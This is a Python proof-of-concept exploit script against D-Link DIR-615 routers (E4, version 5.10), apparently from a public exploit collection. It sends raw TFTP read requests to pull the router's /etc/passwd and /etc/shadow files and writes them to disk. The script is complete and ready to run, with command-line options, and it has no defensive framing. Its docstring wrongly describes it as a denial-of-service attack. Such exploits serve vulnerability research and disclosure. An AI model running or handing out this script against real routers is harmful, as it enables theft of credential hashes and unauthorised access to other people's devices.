# D-Link DIR-615 TFTP Credentials Disclosure (PoC)
# Written by: ftdot
# Tested on: DIR-615 E4 Ver.: 5.10

import sys
import argparse
import socket

from pathlib import Path


def dir615_tftp_creds_disclosure_exploit(address: str, save_path: Path, port: int = 69):
  """Performs DoS TFTP service on DIR-615 router"""

  print(f'[*] Exploiting {address}:{port} by DIR-615 TFTP Credentials Disclosure exploit')

  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def getfile(path: str):
      # Send get file request
      s.sendto(b'\x00\x01' + path.encode() + b'\x00netascii\x00', (address, port))
      return s.recv(65535) # Recieve file content

    (save_path / 'passwd').write_bytes(getfile('/etc/passwd')[4:])  # get and write out passwd file
    (save_path / 'shadow').write_bytes(getfile('/etc/shadow')[4:])  # get and write out shadow file

    print('[+] Success')
  except Exception as e:
    print(f'[-] Cannot exploit, exception occurred:\n{e}')


if __name__ == '__main__':

  parser = argparse.ArgumentParser()
  parser.add_argument('-i', '--ip',
                      default='192.168.0.1',
                      help='IP address of the router (Default: 192.168.0.1)'
                      )
  parser.add_argument('-p', '--port',
                      default=69,
                      type=int,
                      help='Port of the TFTP service (Default: 69)'
                      )
  parser.add_argument('-P', '--path',
                      default='./',
                      help='Path to the directory where be exported data (Default: ./)'
                      )

  args = parser.parse_args()

  p = Path(args.path)

  if not p.is_dir():
    print('[-] Directory doesn\'t exist!')
    sys.exit()

  dir615_tftp_creds_disclosure_exploit(args.ip, p, args.port)
